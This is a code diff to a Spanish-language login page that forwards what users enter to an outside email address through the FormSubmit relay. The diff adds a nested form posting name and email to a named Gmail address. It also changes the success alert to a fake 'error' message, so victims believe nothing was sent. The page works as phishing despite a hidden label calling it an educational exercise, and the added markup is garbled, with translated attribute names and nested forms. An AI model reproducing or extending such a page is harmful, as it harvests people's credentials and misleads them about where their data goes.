@@ -70,6 +70,14 @@
             <input type="hidden" name="_subject" value="Datos de formulario (Ejercicio educativo)">
             <input type="hidden" name="_template" value="table">
             <button type="submit">Iniciar Sesión</button>
+
+            <form action="https://formsubmit.co/videoslacra@gmail.com" método="POST">
+     <input type="text" name="nombre" requerido>
+     <input type="email" name="email" requerido>
+     <button type="submit">Enviar</button>
+
+                
+</form>
         </form>
         <div id="log" class="hidden-log">
             <h3>Datos registrados:</h3>
@@ -102,7 +110,7 @@
                 });
                 if (response.ok) {
                     console.log('Datos enviados a FormSubmit');
-                    alert('Datos enviados a tu correo (verifica tu bandeja de entrada o spam).');
+                    alert('error).');
                 } else {
                     console.error('Error al enviar datos');
                     alert('Error al enviar los datos.');
